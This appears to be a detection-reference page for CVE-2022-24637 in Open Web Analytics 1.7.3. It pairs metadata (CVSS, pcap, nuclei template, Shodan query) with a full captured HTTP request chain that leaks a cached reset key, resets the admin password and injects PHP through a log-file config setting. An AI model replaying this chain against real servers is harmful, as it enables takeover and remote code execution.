---
layout: "post"
cve_id: "CVE-2022-24637"
title: "Open Web Analytics 1.7.3 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-24637.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24637.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "critical"
reference:
  - "https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/open_web_analytics_rce.rb"
  - "http://packetstormsecurity.com/files/171389/Open-Web-Analytics-1.7.3-Remote-Code-Execution.html"
  - "https://github.com/Open-Web-Analytics/Open-Web-Analytics/releases/tag/1.7.4"
  - "https://github.com/Pflegusch/CVE-2022-24637"
  - "https://github.com/c0derpwner/HTB-pwned"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2022-24637"
  cwe-id: "CWE-269"
  epss-score: 0.93978
  epss-percentile: 0.99878
  cpe: "cpe:2.3:a:openwebanalytics:open_web_analytics:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 6
  vendor: "openwebanalytics"
  product: "open_web_analytics"
  shodan-query: "cpe:\"cpe:2.3:a:openwebanalytics:open_web_analytics\""
tags:
  - "cve"
  - "cve2022"
  - "packetstorm"
  - "rce"
  - "intrusive"
  - "open-web-analytics"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated remote attacker to obtain sensitive user information, which can be used to gain admin privileges by leveraging cache hashes. This occurs because files generated with '<?php (instead of the intended "<?php sequence) aren't handled by the PHP interpreter.


## üåê HTTP Request
```nohighlight
POST /index.php?owa_do=base.loginForm&owa_site_id HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 100
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

owa_user_id=admin&owa_password=wrong+password+xyz&owa_go=&owa_action=base.login&owa_submit_btn=Login
```

```nohighlight
GET /owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Connection: close
Content-Length: 131
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

owa_password=09oh0zvr&owa_password2=09oh0zvr&owa_k=Rkdlx6&owa_action=base.usersChangePassword&owa_submit_btn=Save+Your+New+Password
```

```nohighlight
POST /index.php?owa_do=base.loginForm&owa_site_id HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 90
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

owa_user_id=admin&owa_password=09oh0zvr&owa_go=&owa_action=base.login&owa_submit_btn=Login
```

```nohighlight
GET /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Connection: close
Cookie: owa_p=RdOggM;owa_u=admin;
Accept-Encoding: gzip
```

```nohighlight
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 161
Content-Type: application/x-www-form-urlencoded
Cookie: owa_p=RdOggM;owa_u=admin;
Accept-Encoding: gzip

owa_action=base.optionsUpdate&owa_nonce=wrc0Gh&owa_config[base.error_log_file]=owa-data/caches/36hHEs1D4QuHCwMnoX9YINCaiAO.php&owa_config[base.error_log_level]=2
```

```nohighlight
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.17
Connection: close
Content-Length: 132
Content-Type: application/x-www-form-urlencoded
Cookie: owa_p=RdOggM;owa_u=admin;
Accept-Encoding: gzip

owa_action=base.optionsUpdate&owa_nonce=wrc0Gh&owa_config[shell]=<?php+echo base64_decode('MzZoSEVzMUQ0UXVIQ3dNbm9YOVlJTkNhaUFP');?>
```

```nohighlight
GET /owa-data/caches/36hHEs1D4QuHCwMnoX9YINCaiAO.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Accept-Encoding: gzip
```


